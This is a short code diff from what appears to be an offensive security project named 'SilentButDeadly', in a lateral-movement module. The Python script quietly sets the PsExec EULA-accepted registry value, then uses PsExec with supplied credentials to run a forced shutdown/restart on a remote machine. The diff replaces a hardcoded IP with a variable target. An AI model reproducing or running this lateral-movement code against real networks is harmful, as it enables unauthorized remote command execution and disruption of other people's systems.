@@ -37,7 +37,7 @@ if __name__ == '__main__':
         try:
             print(str(os.popen('reg.exe ADD HKCU\Software\Sysinternals\PSexec /v EulaAccepted /t REG_DWORD /d 1 /f')))
             print(str(os.popen(
-                r'Psexec \\192.168.68.125 -u ' + user + ' -p ' + password + ' -w c:\SilentButDeadly(CyberProject)\LateralMovement -s -i shutdown /r').read()))
+                r'Psexec \\' + ip + ' -u ' + user + ' -p ' + password + ' -w c:\SilentButDeadly(CyberProject)\LateralMovement -s -i shutdown /r').read()))
             print('DONE')
             run = False
         except:
